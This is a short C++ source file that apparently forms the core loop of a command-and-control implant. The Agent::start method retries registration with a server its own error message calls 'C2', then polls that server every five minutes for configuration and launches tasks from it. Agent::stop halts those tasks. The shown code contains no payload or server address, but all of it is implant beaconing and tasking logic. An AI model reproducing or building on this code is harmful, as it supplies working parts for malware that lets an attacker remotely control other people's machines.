#include "Agent.h"

void Agent::start()
{
    // ################################################
    // FOR MODULES DEBUGGING:
    // uncomment the next lines and change the debug_conf (should be in your ruuning dir)
    // 
    // std::string path = "debug_conf.json";
    // std::ifstream file(path);
    // if (!file.is_open()) {
    //     std::cerr << "Could not open the file: " << path << std::endl;
    //     return;
    // }
    // json config;
    // try {
    //     file >> config;
    // } catch (const json::parse_error& e) {
    //     std::cerr << "Failed to parse JSON: " << e.what() << std::endl;
    //     return;
    // }
    // start_from_config(config);
    // sleep(1000000);
    // ################################################

    unsigned tries = 0;
    while (!agent_register())
    {
        tries += 1;
        if (tries >= 10)
        {
            throw std::runtime_error("Can't register to C2");
        }

        sleep(5);
    }

    while (agent_run)
    {
        if(get_server_config())
        {
            start_from_config(config);
        }
        sleep(60 * 5);
    }
}


void Agent::stop()
{
    for (const std::unique_ptr<Task> & t : tasks)
    {
        t->stop();
    }
}